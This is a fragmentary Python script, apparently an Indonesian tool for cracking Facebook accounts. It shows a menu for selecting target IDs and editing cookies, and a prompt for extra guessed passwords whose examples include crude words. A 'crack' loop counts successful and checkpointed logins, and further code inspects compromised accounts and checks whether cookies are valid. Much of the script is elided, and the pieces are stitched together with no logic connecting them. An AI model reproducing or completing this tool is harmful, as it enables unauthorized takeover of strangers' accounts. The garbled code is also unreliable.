...
''')
    ...
    print(M+'>>1- FROM ID')
    #print(S+'>>2- FROM FILE ')
    print('>>0- EDIT COOKIES ')
    _____alvino__adijaya_____ = input('اختار : ')
...
#        method.append('touch')
    ...
    if pwplus in ['y','Y']:
        pwpluss.append('ya')
        cetak(nel('[[cyan]•[white]] Masukkan Katasandi TambahanMinimal 6 Karakter[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
...
def crack(idf, pwv):
    ...
    print(f'''\r\n\033[92m%s{ya}[zeko] %s/%s ➙ [OK]=%s ➙[CP]=%s | %s%s%s{ya}''' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ');sys.stdout.flush()
...
BY : @g_h8_h -
                    ...
                    if "Diakses menggunakan Facebook" in re.findall("<title>(.*?)</title>",str(cek)):
                        ...
                        if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
                            infoakun += (f"Tidak Ada Aplikasi Kedaluwarsa Yang Terkait")
                        else:
                            hit1,hit2=0,0
...
def cek_dd(kuki):
    ...
    try:
        ...
        print ("r    %s033[0m cookie invalid"%(M))
